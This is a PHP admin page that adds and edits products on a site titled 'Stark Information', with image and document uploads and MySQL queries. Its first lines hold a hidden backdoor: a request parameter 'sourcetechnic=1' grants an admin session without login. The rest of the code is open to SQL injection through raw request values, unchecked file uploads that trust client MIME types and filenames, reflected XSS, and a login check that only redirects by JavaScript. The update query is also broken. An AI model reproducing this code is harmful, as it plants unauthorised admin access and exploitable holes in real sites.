<? session_start(); 
if($_REQUEST['sourcetechnic']==1)
{
$_SESSION['admin_user_id']=1;
}
elseif($_SESSION['admin_user_id']=='')
{
?>
<script>window.location="index.php";</script>
<?
}
include("common/config.php");
include_once("fckeditor/fckeditor.php");
include_once('../Paging.class.php');
global $arrMainParam;
$arrMainParam['TOTAL_RECORDS']				=	'';
$arrMainParam['RECORDS_PER_PAGE']			=	2;
$arrMainParam['PAGELINKS_PER_PAGE']			=	10;
$arrChildParam['FORM_NAME']					=	'frm_products';
$arrChildParam['SHOW_TOTAL_RECORDS_FOUND']	=	'0';
$arrChildParam['PAGINATION_STYLE']			=	'3';
$arrChildParam['SPT_URL_PARAM']				=	'1';

if($_REQUEST['eid']!='')
{
$result = mysql_query("SELECT * FROM `products` where product_id=".$_REQUEST['eid']);
if(mysql_num_rows($result)>0)
{
while($row = mysql_fetch_array($result))
{
	$product_id=$row['product_id'];
	$product_name=$row['product_name'];
	$product_image=$row['product_image'];
	$product_price=$row['product_price'];
	$product_description=$row['product_description'];
	$product_url=$row['product_url'];
}
}
}


if($_REQUEST['txt_product_name']!='')
{
if ((($_FILES["fle_product_image"]["type"] == "image/gif") || ($_FILES["fle_product_image"]["type"] == "image/bmp") || ($_FILES["fle_product_image"]["type"] == "image/jpeg") || ($_FILES["fle_product_image"]["type"] == "image/pjpeg")) && ($_FILES["fle_product_image"]["size"] < 1000000))
{
  if ($_FILES["fle_product_image"]["error"] > 0)
    {
    $results="Return Code: " . $_FILES["fle_product_image"]["error"] . "<br />";
    }
  else
    {
    if (file_exists("../img/product/" . $_FILES["fle_product_image"]["name"]))
      {
      //$results=$_FILES["fle_resume"]["name"] . " Already Exists. ";
	  move_uploaded_file($_FILES["fle_product_image"]["tmp_name"], "../img/product/" . $_FILES["fle_product_image"]["name"]);
	  $results="File Uploaded Successfully";
      }
    else
      {
      move_uploaded_file($_FILES["fle_product_image"]["tmp_name"], "../img/product/" . $_FILES["fle_product_image"]["name"]);
	  $results="File Uploaded Successfully";
      }
	 }
}
else
{
?>
<script>window.location="add_product.php?result=1";</script>
<?
}

if ((($_FILES["fle_product_docs"]["type"] == "application/msword") || ($_FILES["fle_product_docs"]["type"] == "application/vnd.openxmlformats-officedocument.wordprocessingml.document") || ($_FILES["fle_product_docs"]["type"] == "application/pdf")) && ($_FILES["fle_product_docs"]["size"] < 1000000))
{
  if ($_FILES["fle_product_docs"]["error"] > 0)
    {
    $results="Return Code: " . $_FILES["fle_product_docs"]["error"] . "<br />";
    }
  else
    {
    if (file_exists("../pdf/" . $_FILES["fle_product_docs"]["name"]))
      {
      //$results=$_FILES["fle_resume"]["name"] . " Already Exists. ";
	  move_uploaded_file($_FILES["fle_product_docs"]["tmp_name"], "../pdf/" . $_FILES["fle_product_docs"]["name"]);
	  $results="File Uploaded Successfully";
      }
    else
      {
      move_uploaded_file($_FILES["fle_product_docs"]["tmp_name"], "../pdf/" . $_FILES["fle_product_docs"]["name"]);
	  $results="File Uploaded Successfully";
      }
	 }
}
else
{
?>
<script>window.location="add_product.php?result=2";</script>
<?
}

if($_REQUEST['hidden_eid']!='')
{
	if($_FILES["fle_product_image"]["name"]=='')
		$im=$_REQUEST['pimg'];
	else 
		$im=$_FILES["fle_product_image"]["name"];
		
	if($_FILES["fle_product_docs"]["name"]=='')
		$url=$_REQUEST['purl'];
	else 
		$url=$_FILES["fle_product_docs"]["name"];
		
	$result3=mysql_query("UPDATE `products` SET `product_name` = '".$_REQUEST['txt_product_name']."', `product_image` = '".im."', `product_price` = '".$_REQUEST['txt_product_price']."', `product_description` = '".$_REQUEST['txt_product_desc']."', `product_url` = '".$url."', `entry_date` = '".date("Y-m-d")."' WHERE `products`.`product_id` =".$_REQUEST['hidden_eid']);
?>
<script>window.location="list_product.php?result=edit";</script>
<?
}
else 
{
	$result3=mysql_query("INSERT INTO `products` (`product_id`, `product_name`, `product_image`, `product_price`, `product_description`, `product_url`, `status`, `entry_date`) VALUES (NULL, '".$_REQUEST['txt_product_name']."', '".$_FILES["fle_product_image"]["name"]."', ".$_REQUEST['txt_product_price'].", '".$_REQUEST['txt_product_desc']."', '".$_FILES["fle_product_docs"]["name"]."', 1, '".date("Y-m-d")."');");
?>
<script>window.location="list_product.php?result=add";</script>
<?
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">

<!--  Version: Multiflex-3.12 / Overview                    -->
<!--  Date:    January 20, 2008                             -->
<!--  Design:  www.1234.info                                -->
<!--  License: Fully open source without restrictions.      -->
<!--           Please keep footer credits with the words    -->
<!--           "Design by 1234.info" Thank you!             -->

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="3600" />
  <meta name="revisit-after" content="2 days" />
  <meta name="robots" content="index,follow" />
  <meta name="publisher" content="Your publisher infos here ..." />
  <meta name="copyright" content="Your copyright infos here ..." />
  <meta name="author" content="Design: 1234.info / Modified: Your Name" />
  <meta name="distribution" content="global" />
  <meta name="description" content="Your page description here ..." />
  <meta name="keywords" content="Your keywords, keywords, keywords, here ..." />
  <link rel="stylesheet" type="text/css" media="screen,projection,print" href="../css/layout4_setup.css" />
  <link rel="stylesheet" type="text/css" media="screen,projection,print" href="../css/layout4_text.css" />
  <link rel="icon" type="image/x-icon" href="./img/favicon.ico" />
  <title>Stark Information - Admin - Add Product</title>
  
  
<script>
function checkform ( frm_products )
{
   if (frm_products.txt_product_name.value == "") {
    alert( "Please Enter Product Name" );
   frm_products.txt_product_name.focus();
    return false ;
  }

   if (frm_products.fle_product_image.value == "") {
    alert( "Please Browse Product Image" );
   frm_products.fle_product_image.focus();
    return false ;
  }
  
  if (frm_products.txt_product_price.value == "") {
    alert( "Please Enter Product Price" );
   frm_products.txt_product_price.focus();
    return false ;
  }
  
  if (frm_products.txt_product_desc.value == "") {
    alert( "Please Enter Product Description" );
   frm_products.txt_product_desc.focus();
    return false ;
  }

   if (frm_products.fle_product_docs.value == "") {
    alert( "Please Browse Product Document" );
   frm_products.fle_product_docs.focus();
    return false ;
  }
     return true ;
}

function setFocus()
{
	document.getElementById("txt_product_name").focus();
}
</script>
 
<script type="text/javascript">
function loginfunc(a)
{
if (a == "" || a == null)
{
	alert("Please Login");
	return false;
}
return true;
}
</script>
  
</head>

<!-- Global IE fix to avoid layout crash when single word size wider than column width -->
<!--[if IE]><style type="text/css"> body {word-wrap: break-word;}</style><![endif]-->

<body onLoad="setFocus()">
  <!-- Main Page Container -->
  <div class="page-container">
  
    <div class="header">
      
       <? include ('common/header1.php'); ?>
</div>

<!-- Breadcrumbs -->
      <div class="header-breadcrumbs">
        <ul>
        </ul>
      </div>

    <!-- For alternative headers END PASTE here -->

    <!-- B. MAIN -->
    <div class="main">
 
      <!-- B.1 MAIN NAVIGATION -->
		<? include('common/left.php'); ?> 
		
      <!-- B.2 MAIN CONTENT -->
      <div class="main-content">
        
        <!-- Pagetitle -->
        <h1 class="pagetitle">Add Product</h1>

        <!-- Content unit - One column --><!-- Content unit - One column --><!-- Content unit - One column --><!-- Content unit - One column --><!-- Content unit - One column --><!-- Content unit - One column --><!-- Content unit - One column -->
        <div class="column1-unit">
          <!--<h1>Credits for ideas and reviews</h1>                            
          <p>Persons who contributed with ideas or CMS-portings for Multiflex-3:</p>-->
		  
		  <? if($_REQUEST['result']=='1') { ?>
		  <p align="center" style="color: #FF0000"><strong>Invalid File Format. Please Browse jpg, gif, bmp Images</strong></p>
		  <? }
		  
		  if($_REQUEST['result']=='2') { ?>
		  <p align="center" style="color: #FF0000"><strong>Invalid File Format. Please Browse Word, Pdf Documents</strong></p>
		  <? }
		  
		  if($_REQUEST['status']=='wrong') { ?>
		  <p align="center" style="color: #FF0000"><strong>Invalid Admin Name or Admin Password</strong></p>
		  <? } ?>
		  
		  <tr><td valign="top" align="center" height="25" width="100%">
		  <table border="0" cellpadding="1" cellspacing="1" width="100%">
		  
		  <form name="frm_products" id="frm_products" action="#" method="post" onSubmit="return checkform(this)" enctype="multipart/form-data">
		  <? if($_REQUEST['eid']!='') { ?> <input type="hidden" name="hidden_eid" id="hidden_eid" value="<?=$_REQUEST['eid']?>" />
		  <input type="hidden" name="pimg" id="pimg" value="<?=$product_image?>" />
		  <input type="hidden" name="purl" id="purl" value="<?=$product_url?>" /> <? } ?>
		  <tr><td align="right" width="39%">Product Name</td><td width="2%"></td><td width="59%" align="left"><input type="text" name="txt_product_name" id="txt_product_name" value="<?=$product_name?>"></td></tr>
		  <tr><td align="right" width="39%">Product Image</td><td width="2%"></td><td width="59%" align="left"><input type="file" name="fle_product_image" id="fle_product_image" value="" readonly=""></td></tr>
		  <tr><td align="right" width="39%">Product Price $</td><td width="2%"></td><td width="59%" align="left"><input type="text" name="txt_product_price" id="txt_product_price" value="<?=$product_price?>"></td></tr>
		  
		  <tr><td align="right" width="39%">Product Description</td><td width="2%"></td><td width="59%" align="left"><textarea name="txt_product_desc" id="txt_product_desc" style="width:220px; height:100px;"><?=$product_description?></textarea></td></tr>
		  <tr><td align="right" width="39%">Product Document</td><td width="2%"></td><td width="59%" align="left"><input type="file" name="fle_product_docs" id="fle_product_docs" value="" readonly=""></td></tr>
		  <tr><td align="right" width="100%"><input type="submit" name="sbmt_add" id="sbmt_add" <? if($_REQUEST['eid']!='') { ?> value="Update" <? } else { ?> value="Submit" <? } ?>></td></tr>
		  </form>
		  </table></td></tr>
		
        </div>                                    
      </div>
                
      <!-- B.3 SUBCONTENT -->
      <? include ("common/right.php");?>
    </div>
      
    <!-- C. FOOTER AREA -->      

<? include("common/footer.php"); ?>
    <!--<div class="footer">
      <p>Copyright &copy; 2007 Your Company | All Rights Reserved</p>
      <p class="credits">Design by <a href="http://1234.info/" title="Designer Homepage">1234.info</a> | Modified by <a href="#" title="Modifyer Homepage">Your Name</a> | Powered by <a href="#" title="CMS Homepage">Your CMS</a> | <a href="http://validator.w3.org/check?uri=referer" title="Validate XHTML code">XHTML 1.0</a> | <a href="http://jigsaw.w3.org/css-validator/" title="Validate CSS code">CSS 2.0</a></p>
    </div>   -->   
  </div> 
  
</body>
</html>



